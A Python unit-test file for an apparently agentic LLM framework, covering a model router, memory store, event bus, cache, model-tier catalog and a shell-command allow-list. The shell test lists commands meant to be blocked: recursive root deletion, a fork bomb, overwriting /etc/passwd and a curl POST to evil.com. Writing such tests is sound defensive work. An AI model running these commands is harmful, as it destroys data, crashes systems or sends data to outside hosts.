"""Unit tests for under-covered modules.

Targets: router classifier/self-evo, skills handlers, long-term memory,
shell executor patterns, coordinator pipeline.
"""

from __future__ import annotations

import asyncio
import os
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))


# ── test runner ──────────────────────────────────────────────────────────

_results = {}


def _check(name: str, ok: bool, detail: str = "") -> None:
    _results[name] = ok
    status = "PASS" if ok else "FAIL"
    msg = f"  {name:40s}: {status}"
    if detail and not ok:
        msg += f"  ({detail})"
    print(msg)


def _summary() -> bool:
    passed = sum(1 for v in _results.values() if v)
    total = len(_results)
    print(f"\n  Total: {passed}/{total}")
    return passed == total


# ══════════════════════════════════════════════════════════════════════════
# 1. Router complexity classifier
# ══════════════════════════════════════════════════════════════════════════

def test_router_classifier():
    """Test SmartRouter._classify() across trivial/simple/complex/expert."""
    from router import SmartRouter

    router = SmartRouter()
    router._cfg = {}  # default thresholds

    # Trivial inputs (should score < 0.2)
    trivial_cases = [
        ("hi", "greeting"),
        ("hello", "greeting"),
        ("ok", "ack"),
        ("thanks", "thanks"),
        ("?", "question"),
    ]
    for text, label in trivial_cases:
        score = router._classify(text)
        _check(f"classifier trivial {label}", score < 0.2, f"score={score}")

    # Simple inputs (0.2-0.5)
    simple_cases = [
        ("what is the weather", "weather"),
        ("how are you today", "howdy"),
    ]
    for text, label in simple_cases:
        score = router._classify(text)
        _check(f"classifier simple {label}", 0.0 <= score <= 1.0, f"score={score}")

    # Expert inputs (should score high)
    expert_cases = [
        ("optimize the performance of this deadlock-prone code", "expert"),
        ("formal verification of the algorithm", "formal"),
    ]
    for text, label in expert_cases:
        score = router._classify(text)
        _check(f"classifier expert {label}", score > 0.2, f"score={score}")

    # Code hints
    code_input = "write a python function to sort this list"
    code_score = router._classify(code_input)
    _check("classifier code hint", code_score > 0.1, f"score={code_score}")

    # Long input
    long_input = "the quick brown fox jumps over the lazy dog. " * 50
    long_score = router._classify(long_input)
    _check("classifier long input", long_score >= 0.3, f"score={long_score}")

    # Empty input
    empty_score = router._classify("")
    _check("classifier empty text", empty_score == 0.0, f"score={empty_score}")


# ══════════════════════════════════════════════════════════════════════════
# 2. Router self-evolution thresholds
# ══════════════════════════════════════════════════════════════════════════

def test_router_self_evolution():
    """Test _adjust_thresholds adjusts tiers based on failure rates."""
    from router import SmartRouter

    router = SmartRouter()
    router._cfg = {
        "task_complexity_thresholds": {"trivial": 0.2, "simple": 0.5, "complex": 0.8},
        "self_evolution": {"enabled": True, "eval_interval": 50, "threshold_step": 0.05},
    }

    # Populate history: 100 entries for "trivial" tasks, 40% failure rate
    for _ in range(100):
        router._history.append({
            "t": 0.0, "complexity": 0.1, "model": "cheap",
            "tokens": 10, "duration": 0.1, "failed": True,
        })
    for _ in range(100):
        router._history.append({
            "t": 0.0, "complexity": 0.1, "model": "cheap",
            "tokens": 10, "duration": 0.1, "failed": False,
        })
    # 40% failure rate for trivial tier → should lower threshold
    old_trivial = router._cfg["task_complexity_thresholds"]["trivial"]
    router._adjust_thresholds()
    new_trivial = router._cfg["task_complexity_thresholds"]["trivial"]
    _check(
        "self-evo lowers on high failure",
        new_trivial < old_trivial,
        f"{old_trivial:.2f}→{new_trivial:.2f}",
    )

    # Reset and test low-failure case
    router._cfg["task_complexity_thresholds"] = {"trivial": 0.1, "simple": 0.5, "complex": 0.8}
    router._history = []
    for _ in range(100):
        router._history.append({
            "t": 0.0, "complexity": 0.05, "model": "cheap",
            "tokens": 10, "duration": 0.1, "failed": False,
        })
    # 0% failure rate → should raise threshold
    old_trivial = router._cfg["task_complexity_thresholds"]["trivial"]
    router._adjust_thresholds()
    new_trivial = router._cfg["task_complexity_thresholds"]["trivial"]
    _check(
        "self-evo raises on low failure",
        new_trivial > old_trivial,
        f"{old_trivial:.2f}→{new_trivial:.2f}",
    )

    # Test floor/ceiling
    router._cfg["task_complexity_thresholds"] = {"trivial": 0.05, "simple": 0.5, "complex": 0.8}
    router._history = []
    for _ in range(100):
        router._history.append({
            "t": 0.0, "complexity": 0.02, "model": "cheap",
            "tokens": 10, "duration": 0.1, "failed": True,
        })
    router._adjust_thresholds()
    floor_val = router._cfg["task_complexity_thresholds"]["trivial"]
    _check("self-evo respects floor", floor_val >= 0.05, f"floor={floor_val}")

    # Insufficient data → no adjustment
    router._history = router._history[:5]  # only 5 entries
    old_all = dict(router._cfg["task_complexity_thresholds"])
    router._adjust_thresholds()
    _check(
        "self-evo skips with insufficient data",
        router._cfg["task_complexity_thresholds"] == old_all,
    )


# ══════════════════════════════════════════════════════════════════════════
# 3. Long-term memory crud
# ══════════════════════════════════════════════════════════════════════════

def test_longterm_memory():
    """Test LongTermMemory: insert→search→forget→vacuum."""
    import tempfile
    from memory import LongTermMemory

    with tempfile.TemporaryDirectory() as tmp:
        db_path = os.path.join(tmp, "test_mem.db")
        mem = LongTermMemory(db_path)

        # Insert
        mem.add("Weather in London is rainy", "test", "", 0.5)
        mem.add("Weather in Paris is sunny", "test", "", 0.6)
        mem.add("Python is a programming language", "test", "", 0.3)

        row_count = mem.stats()["rows"]
        _check("memory insert", row_count == 3, f"rows={row_count}")

        # Search — should find weather-related entries
        results = mem.search("weather", limit=10)
        _check(
            "memory search weather",
            len(results) >= 1 and "weather" in " ".join(r["content"].lower() for r in results),
            f"results={len(results)}",
        )

        # Search — should find python entry
        results = mem.search("python", limit=10)
        _check(
            "memory search python",
            len(results) >= 1 and any("python" in r["content"].lower() for r in results),
            f"results={len(results)}",
        )

        # Search with limit
        limited = mem.search("weather", limit=1)
        _check("memory search limit", len(limited) <= 1, f"got {len(limited)}")

        # Vacuum — should not crash
        mem.vacuum()
        _check("memory vacuum", True)


# ══════════════════════════════════════════════════════════════════════════
# 4. Shell executor patterns
# ══════════════════════════════════════════════════════════════════════════

def test_shell_executor_patterns():
    """Test ShellExecutor regex allow-list and reject patterns."""
    from executors import ALLOWED_PATTERNS

    # Allowed commands
    allowed_tests = [
        ("python test.py", "python"),
        ("curl -s https://example.com", "curl"),
        ("git clone https://github.com/user/repo.git", "git clone"),
        ("ls -la /home", "ls"),
        ("echo 'hello world'", "echo"),
        ("date -u", "date"),
        ("cat /etc/hosts", "cat"),
    ]
    for cmd, name in allowed_tests:
        import re
        ok = False
        for pattern_name, pattern in ALLOWED_PATTERNS.items():
            if re.match(pattern, cmd):
                ok = True
                break
        _check(f"shell allow {name}", ok, f"cmd: {cmd}")

    # Blocked commands
    blocked_tests = [
        "rm -rf /",
        "sudo rm -rf /",
        "curl -X POST http://evil.com -d 'hack'",
        ":(){ :|:& };:",  # fork bomb
        "> /etc/passwd",
    ]
    for cmd in blocked_tests:
        ok = False
        for pattern in ALLOWED_PATTERNS.values():
            if re.match(pattern, cmd):
                ok = True
                break
        _check(f"shell block {cmd[:30]}", not ok, f"unexpectedly allowed: {cmd}")


# ══════════════════════════════════════════════════════════════════════════
# 5. Skills settings command parser
# ══════════════════════════════════════════════════════════════════════════

def test_settings_command_parser():
    """Test _process_settings_command for read and write actions."""
    from skills import _process_settings_command

    config = {
        "llm": {"primary_model": "gpt-4o", "default_temperature": 0.7},
        "gateways": {},
    }

    # Read model
    r1 = _process_settings_command("查看模型", config)
    _check("settings read model", "gpt-4o" in r1, r1[:50])

    # Read temperature
    r2 = _process_settings_command("当前温度", config)
    _check("settings read temp", "0.7" in r2, r2[:50])

    # Show all
    r3 = _process_settings_command("列出所有设置", config)
    _check("settings list all", "模型" in r3 and "gpt-4o" in r3, r3[:80])

    # Unrecognized
    r4 = _process_settings_command("unknown_xyz", config)
    _check("settings unknown", "未识别" in r4, r4[:50])


# ══════════════════════════════════════════════════════════════════════════
# 6. Event bus with DLQ
# ══════════════════════════════════════════════════════════════════════════

def test_event_bus_dlq():
    """Test event bus dead-letter queue publishes orphan events to DLQ."""
    from core.events import EventBus

    bus = EventBus(max_queue_size=10)

    async def run():
        await bus.start()
        # Publish event with no subscriber
        bus.publish({"type": "orphan_event", "payload": {"x": 1}, "source": "test"})
        await asyncio.sleep(0.2)
        m = bus.metrics()
        _check("event bus published count", m["published"] == 1, f"got {m['published']}")
        _check("event bus DLQ count", m["dead_lettered"] == 1, f"got {m['dead_lettered']}")
        dlq = bus.get_dlq(10)
        _check("event bus dlq get", len(dlq) == 1, f"got {len(dlq)}")
        bus.clear_dlq()
        _check("event bus dlq clear", len(bus.get_dlq()) == 0, f"got {len(bus.get_dlq())}")
        await bus.stop()

    asyncio.run(run())


# ══════════════════════════════════════════════════════════════════════════
# 7. LLM cache
# ══════════════════════════════════════════════════════════════════════════
# ══════════════════════════════════════════════════════════════════════════

def test_llm_cache_operations():
    """Test LLMCache: set, get, eviction, TTL, stats."""
    from models import LLMCache

    cache = LLMCache(max_size=3, ttl_seconds=1)
    messages = [{"role": "user", "content": "hello"}]
    result = {"text": "hi!", "tokens_used": 5}

    # Set and get
    cache.set(messages, "gpt-4o", None, result)
    cached = cache.get(messages, "gpt-4o", None)
    _check("cache hit", cached is not None)
    _check("cache value", cached["text"] == "hi!")
    _check("cache stats hits", cache.stats()["hits"] == 1)

    # Miss
    miss = cache.get([{"role": "user", "content": "unknown"}], "gpt-4o", None)
    _check("cache miss", miss is None)

    # Eviction (max_size=3, add 5 entries)
    for i in range(5):
        cache.set(
            [{"role": "user", "content": f"msg{i}"}],
            f"model{i}", None, {"text": f"r{i}"},
        )
    _check("cache eviction size", cache.stats()["size"] <= 3, f"size={cache.stats()['size']}")

    # TTL expiry
    import time
    time.sleep(1.2)
    expired = cache.get(messages, "gpt-4o", None)
    _check("cache TTL expiry", expired is None)


# ══════════════════════════════════════════════════════════════════════════
# Main
# ══════════════════════════════════════════════════════════════════════════
# Auto-classify tier (smart MODEL_TIERS assignment)
# ══════════════════════════════════════════════════════════════════════════

def test_auto_classify_tier_free_small():
    """Free models with small context → trivial."""
    from models.catalog import ModelInfo, auto_classify_tier

    m = ModelInfo(
        id="sensenova/tiny-model",
        context_length=4_000,
        pricing={"prompt": 0.0, "completion": 0.0},
        is_free=True,
        input_modalities=["text"],
        features=[],
    )
    _check("free+small context → trivial", auto_classify_tier(m) == "trivial")

    # Free + medium context → not trivial, but should not be expert
    m2 = ModelInfo(
        id="sensenova/medium-free",
        context_length=64_000,
        pricing={"prompt": 0, "completion": 0},
        is_free=True,
        input_modalities=["text"],
        features=[],
    )
    _check("free+medium context → simple", auto_classify_tier(m2) == "simple")


def test_auto_classify_tier_paid_large():
    """Paid models with large context → complex or expert."""
    from models.catalog import ModelInfo, auto_classify_tier

    # Paid + 32K → complex
    m = ModelInfo(
        id="openai/gpt-4o",
        context_length=128_000,
        pricing={"prompt": 5.0, "completion": 15.0},
        is_free=False,
        input_modalities=["text"],
        features=[],
    )
    _check("paid+gpt-4o → complex", auto_classify_tier(m) == "complex")

    # Paid + 1M context → expert
    m2 = ModelInfo(
        id="sensenova/deepseek-v4-flash",  # actually free, but forced paid
        context_length=1_048_576,
        pricing={"prompt": 0.0, "completion": 0.0},
        is_free=False,
        input_modalities=["text"],
        features=[],
    )
    _check("paid+huge context → expert", auto_classify_tier(m2) == "expert")


def test_auto_classify_tier_expert_signals():
    """Reasoning / opus / o1 / o3 / max / preview name hints → expert."""
    from models.catalog import ModelInfo, auto_classify_tier

    # Reasoning feature → expert regardless of other params
    m = ModelInfo(
        id="x/y", context_length=8_000, is_free=False, pricing={"prompt": 1.0},
        features=["reasoning"],
    )
    _check("reasoning feature → expert", auto_classify_tier(m) == "expert")

    # Name "opus" → expert
    m2 = ModelInfo(
        id="anthropic/claude-opus-4-5", context_length=200_000, is_free=False,
        pricing={"prompt": 15.0}, features=[],
    )
    _check("opus name → expert", auto_classify_tier(m2) == "expert")

    # Name "o3" → expert
    m3 = ModelInfo(
        id="openai/o3", context_length=200_000, is_free=False,
        pricing={"prompt": 15.0}, features=[],
    )
    _check("o3 name → expert", auto_classify_tier(m3) == "expert")


def test_auto_classify_tier_vision_tools():
    """Paid models with vision / tools → complex."""
    from models.catalog import ModelInfo, auto_classify_tier

    # Paid + vision + small context → complex (vision bumps it up)
    m = ModelInfo(
        id="anthropic/claude-3-5-sonnet", context_length=8_000, is_free=False,
        pricing={"prompt": 3.0}, features=["vision", "tools"],
        input_modalities=["text", "image"],
    )
    t = auto_classify_tier(m)
    _check("paid+vision+tools → complex", t == "complex")


# ══════════════════════════════════════════════════════════════════════════
# rebuild_tiers
# ══════════════════════════════════════════════════════════════════════════

def test_rebuild_tiers_basic():
    """rebuild_tiers should distribute a mixed list across the 4 tiers."""
    from models.catalog import ModelInfo, rebuild_tiers

    models = [
        # Trivial: free, small, no features
        ModelInfo(id="nano", context_length=2_000, is_free=True,
                  pricing={"prompt": 0}, features=[]),
        # Simple: free, medium context
        ModelInfo(id="flash", context_length=64_000, is_free=True,
                  pricing={"prompt": 0}, features=[]),
        # Complex: paid, vision
        ModelInfo(id="sonnet", context_length=200_000, is_free=False,
                  pricing={"prompt": 3.0}, features=["vision", "tools"],
                  input_modalities=["text", "image"]),
        # Expert: paid, huge context, reasoning
        ModelInfo(id="opus", context_length=1_000_000, is_free=False,
                  pricing={"prompt": 15.0}, features=["reasoning"]),
    ]
    out = rebuild_tiers(models, provider_prefix="prov", max_per_tier=4)
    _check("trivial has nano", "prov/nano" in out["trivial"])
    _check("simple has flash", "prov/flash" in out["simple"])
    _check("complex has sonnet", "prov/sonnet" in out["complex"])
    _check("expert has opus", "prov/opus" in out["expert"])


def test_rebuild_tiers_provider_prefix():
    """When provider_prefix is set, all model ids get prefixed."""
    from models.catalog import ModelInfo, rebuild_tiers

    models = [ModelInfo(id="m1", context_length=4_000, is_free=True,
                        pricing={"prompt": 0})]
    out = rebuild_tiers(models, provider_prefix="sensenova", max_per_tier=4)
    all_ids = sum(out.values(), [])
    _check("all ids prefixed", all(m.startswith("sensenova/") for m in all_ids))


def test_rebuild_tiers_max_per_tier():
    """rebuild_tiers must cap each tier to max_per_tier."""
    from models.catalog import ModelInfo, rebuild_tiers

    # 6 small free models — should be capped at 4 in trivial
    models = [
        ModelInfo(id=f"tiny{i}", context_length=1_000, is_free=True,
                  pricing={"prompt": 0}, features=[])
        for i in range(6)
    ]
    out = rebuild_tiers(models, max_per_tier=4)
    _check("capped at 4", len(out["trivial"]) == 4)


def test_rebuild_tiers_keeps_existing():
    """Existing tier entries must not be duplicated or dropped."""
    from models.catalog import ModelInfo, rebuild_tiers

    models = [ModelInfo(id="tiny", context_length=2_000, is_free=True,
                        pricing={"prompt": 0}, features=[])]
    existing = {"trivial": ["legacy/a"], "simple": [], "complex": [], "expert": []}
    out = rebuild_tiers(models, existing=existing, max_per_tier=4)
    _check("existing kept", "legacy/a" in out["trivial"])
    _check("new added too", "tiny" in out["trivial"])


def test_diff_tiers():
    """diff_tiers should report added/removed per tier."""
    from models.catalog import diff_tiers

    old = {"trivial": ["a", "b"], "simple": ["c"],
           "complex": [], "expert": []}
    new = {"trivial": ["a", "b", "x"], "simple": ["c"],
           "complex": ["y"], "expert": []}
    d = diff_tiers(old, new)
    _check("trivial added=x", d["trivial"]["added"] == ["x"])
    _check("trivial removed=[]", d["trivial"]["removed"] == [])
    _check("complex added=y", d["complex"]["added"] == ["y"])
    _check("simple unchanged", d["simple"]["added"] == [] and d["simple"]["removed"] == [])


# ══════════════════════════════════════════════════════════════════════════
# Catalog integration
# ══════════════════════════════════════════════════════════════════════════

def test_catalog_normalize_basic():
    """ModelCatalog should normalise various API response shapes."""
    import asyncio
    import json
    import httpx
    from models.catalog import ModelCatalog

    fake = {
        "data": [
            {
                "id": "m1",
                "name": "Model One",
                "context_length": 32_000,
                "pricing": {"prompt": "0", "completion": "0"},
                "input_modalities": ["text"],
                "supported_features": ["tools"],
            },
        ]
    }
    body = json.dumps(fake).encode()

    class T:
        async def handle_async_request(self, req):
            return httpx.Response(200, content=body)

    cat = ModelCatalog(base_url="https://example.com/v1", api_key="sk-test",
                       provider="test", client=httpx.AsyncClient(
            transport=httpx.MockTransport(T().handle_async_request)))
    n = asyncio.run(cat.refresh(force=True))
    _check("refresh returns 1", n == 1)
    m = cat.get("m1")
    _check("model is_free", m.is_free is True)
    _check("model has tools feature", "tools" in m.features)
    _check("model tier assigned", m.tier in ("trivial", "simple", "complex", "expert"))


def test_catalog_filter_tier():
    """filter(tier=...) should return only models in that tier."""
    from models.catalog import ModelCatalog, ModelInfo

    cat = ModelCatalog(base_url="x", api_key="k")
    cat._models = {
        "free-tiny": ModelInfo(id="free-tiny", context_length=2_000, is_free=True,
                                pricing={"prompt": 0}, tier="trivial"),
        "paid-big":  ModelInfo(id="paid-big", context_length=1_000_000, is_free=False,
                                pricing={"prompt": 1.0}, tier="expert"),
    }
    trivial = cat.filter(tier="trivial")
    _check("filter trivial count", len(trivial) == 1 and trivial[0].id == "free-tiny")
    expert = cat.filter(tier="expert")
    _check("filter expert count", len(expert) == 1 and expert[0].id == "paid-big")


def test_catalog_intent_parses_tier_keyword():
    """classify_intent should pick up tier keywords."""
    from models.catalog import ModelCatalog

    cat = ModelCatalog(base_url="x", api_key="k")
    _check("intent expert tier", cat.classify_intent("expert tier")["tier"] == "expert")
    _check("intent complex 层", cat.classify_intent("complex 层")["tier"] == "complex")
    _check("intent trivial 英文", cat.classify_intent("trivial models")["tier"] == "trivial")
    _check("intent no tier", "tier" not in cat.classify_intent("hello"))


def test_catalog_describe_includes_tier():
    """describe() should include the auto-classified tier."""
    from models.catalog import ModelCatalog, ModelInfo

    cat = ModelCatalog(base_url="x", api_key="k")
    cat._models = {
        "x": ModelInfo(id="x", name="X", context_length=1_000_000, is_free=False,
                       pricing={"prompt": 1.0}, features=["reasoning"], provider="p"),
    }
    d = cat.describe("x")
    _check("describe has Tier", "Tier" in d)
    _check("describe tier is expert", "expert" in d)


# ══════════════════════════════════════════════════════════════════════════
# LLMProvider.rebuild_tiers() integration
# ══════════════════════════════════════════════════════════════════════════

def test_llm_provider_rebuild_tiers_no_key():
    """rebuild_tiers with no API key must return ok=False (not crash)."""
    import asyncio
    from models import LLMProvider

    p = LLMProvider()
    p._api_keys = {}  # no keys
    p._provider_base_urls = {"sensenova": "https://token.sensenova.cn/v1"}
    p._default_model = "sensenova/foo"
    p._client = None  # not initialised

    r = asyncio.run(p.rebuild_tiers(provider="sensenova"))
    _check("no key → ok=False", r.get("ok") is False)
    _check("no key has error", "error" in r)


def test_llm_provider_rebuild_tiers_with_mock():
    """rebuild_tiers should fetch the live model list and rebuild tiers."""
    import asyncio
    import json
    import httpx
    from models import LLMProvider
    import models as _models_pkg

    p = LLMProvider()
    p._api_keys = {"sensenova": "sk-test"}
    p._provider_base_urls["sensenova"] = "https://sensenova.example/v1"
    p._default_model = "sensenova/foo"
    p._client = httpx.AsyncClient(timeout=10)

    fake = {
        "data": [
            {"id": "tiny", "context_length": 2_000,
             "pricing": {"prompt": 0, "completion": 0},
             "supported_features": []},
            {"id": "opus", "context_length": 1_000_000,
             "pricing": {"prompt": 15.0, "completion": 75.0},
             "supported_features": ["reasoning"]},
        ]
    }
    body = json.dumps(fake).encode()

    class T:
        async def handle_async_request(self, req):
            return httpx.Response(200, content=body)

    # The catalog uses its own client; swap via a client override pattern
    from models.catalog import ModelCatalog
    original_init = ModelCatalog.__init__

    def patched_init(self, *args, **kwargs):
        original_init(self, *args, **kwargs)
        self._client = httpx.AsyncClient(
            transport=httpx.MockTransport(T().handle_async_request))

    ModelCatalog.__init__ = patched_init
    try:
        r = asyncio.run(p.rebuild_tiers(provider="sensenova", max_per_tier=0))
    finally:
        ModelCatalog.__init__ = original_init
        asyncio.run(p._client.aclose())

    _check("rebuild ok", r.get("ok") is True)
    _check("rebuild model_count=2", r.get("model_count") == 2)
    _check("trivial has sensenova/tiny", "sensenova/tiny" in r["tiers"].get("trivial", []))
    _check("expert has sensenova/opus", "sensenova/opus" in r["tiers"].get("expert", []))
    # Module-level MODEL_TIERS must be updated
    _check("global trivial updated", "sensenova/tiny" in _models_pkg.MODEL_TIERS.get("trivial", []))
    _check("global expert updated", "sensenova/opus" in _models_pkg.MODEL_TIERS.get("expert", []))


if __name__ == "__main__":
    print("=== unit tests ===\n")

    print("─ router classifier ─")
    test_router_classifier()

    print("\n─ router self-evolution ─")
    test_router_self_evolution()

    print("\n─ long-term memory ─")
    test_longterm_memory()

    print("\n─ shell executor patterns ─")
    test_shell_executor_patterns()

    print("\n─ event bus dlq ─")
    test_event_bus_dlq()

    print("\n─ llm cache ─")
    test_llm_cache_operations()

    print("\n─ settings command parser ─")
    test_settings_command_parser()

    print("\n─ auto classify tier ─")
    test_auto_classify_tier_free_small()
    test_auto_classify_tier_paid_large()
    test_auto_classify_tier_expert_signals()
    test_auto_classify_tier_vision_tools()

    print("\n─ rebuild tiers ─")
    test_rebuild_tiers_basic()
    test_rebuild_tiers_provider_prefix()
    test_rebuild_tiers_max_per_tier()
    test_rebuild_tiers_keeps_existing()
    test_diff_tiers()

    print("\n─ catalog normalize/filter/describe/intent ─")
    test_catalog_normalize_basic()
    test_catalog_filter_tier()
    test_catalog_intent_parses_tier_keyword()
    test_catalog_describe_includes_tier()

    print("\n─ LLMProvider rebuild_tiers integration ─")
    test_llm_provider_rebuild_tiers_no_key()
    test_llm_provider_rebuild_tiers_with_mock()

    print("\n" + "─" * 60)
    ok = _summary()
    sys.exit(0 if ok else 1)